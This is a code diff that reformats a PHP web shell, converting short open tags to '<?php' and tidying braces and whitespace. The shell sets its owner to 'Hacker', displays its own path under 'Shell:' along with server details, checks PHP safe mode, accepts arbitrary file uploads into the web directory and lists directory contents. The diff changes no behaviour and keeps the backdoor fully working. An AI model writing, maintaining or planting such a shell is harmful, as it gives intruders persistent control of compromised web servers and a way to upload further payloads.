@@ -58,15 +58,15 @@
 /*
 /*
 -->
-<?
+<?php
 //
 // Default Changes
-//    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+//    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 
 $owner        = "Hacker";                                                       // Insert your nick
-$version      = "1.0.0";                                                        // The version    
+$version      = "1.0.0";                                                        // The version
 
-//    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+//    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 //
 ?>
 
@@ -89,12 +89,12 @@ cursor:crosshair
 <div align="center">
   <center>
   <p>
-  <?php 
+  <?php
 // Check for safe mode
-if( ini_get('safe_mode') ) {
-   print '<font color=#FF0000><b>Safe Mode ON</b></font>';
+if (ini_get('safe_mode')) {
+    print '<font color=#FF0000><b>Safe Mode ON</b></font>';
 } else {
-   print '<font color=#008000><b>Safe Mode OFF</b></font>';
+    print '<font color=#008000><b>Safe Mode OFF</b></font>';
 }
 
 ?>
@@ -107,13 +107,13 @@ if( ini_get('safe_mode') ) {
     <tr>
       <td width="49%" height="142">
       <p align="center">
-        <font face="Verdana" style="font-size: 8pt"><b>Current Directory:</b> <? echo $_SERVER['DOCUMENT_ROOT']; ?>
+        <font face="Verdana" style="font-size: 8pt"><b>Current Directory:</b> <?php echo $_SERVER['DOCUMENT_ROOT']; ?>
         <br />
-        <b>Shell:</b> <? echo $SCRIPT_FILENAME ?>
+        <b>Shell:</b> <?php echo $SCRIPT_FILENAME ?>
         <br>
-        <b>Server Software:</b> <? echo $SERVER_SOFTWARE ?><br>
-        <b>Server Name:</b> <? echo $SERVER_NAME ?><br>
-        <b>Server Protocol:</b> <? echo $SERVER_PROTOCOL ?><br>
+        <b>Server Software:</b> <?php echo $SERVER_SOFTWARE ?><br>
+        <b>Server Name:</b> <?php echo $SERVER_NAME ?><br>
+        <b>Server Protocol:</b> <?php echo $SERVER_PROTOCOL ?><br>
         </font></tr>
   </table><br />
     <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" width="100%" id="AutoNumber1" height="426" bordercolor="#000000">
@@ -155,34 +155,25 @@ if( ini_get('safe_mode') ) {
 
 function check_file()
 {
-global $file_name, $filename;
+    global $file_name, $filename;
     $backupstring = "copy_of_";
     $filename = $backupstring."$filename";
 
-    if( file_exists($filename))
-    {
+    if (file_exists($filename)) {
         check_file();
     }
 }
 
-if(!empty($file))
-{
+if (!empty($file)) {
     $filename = $file_name;
-    if( file_exists($file_name))
-    {
+    if (file_exists($file_name)) {
         check_file();
         echo "<p align=center>File already exist</p>";
-    }
-
-    else
-    {
-        copy($file,"$filename");
-        if( file_exists($filename))
-        {
+    } else {
+        copy($file, "$filename");
+        if (file_exists($filename)) {
             echo "<p align=center>File uploaded successful</p>";
-        }
-        elseif(! file_exists($filename))
-        {
+        } elseif (! file_exists($filename)) {
             echo "<p align=center>File not found</p>";
         }
     }
@@ -204,11 +195,12 @@ if(!empty($file))
       <form method="post">
 <p align="center">
 <font face="Verdana" style="font-size: 11pt">
-<?
+<?php
 $folder=opendir('./');
 while ($file = readdir($folder)) {
-if($file != "." && $file != "..")
-echo '<a target="_blank" href="'.$file.'">'.$file.'</a ><br>';
+    if ($file != "." && $file != "..") {
+        echo '<a target="_blank" href="'.$file.'">'.$file.'</a ><br>';
+    }
 }
 closedir($folder);
 ?></p>
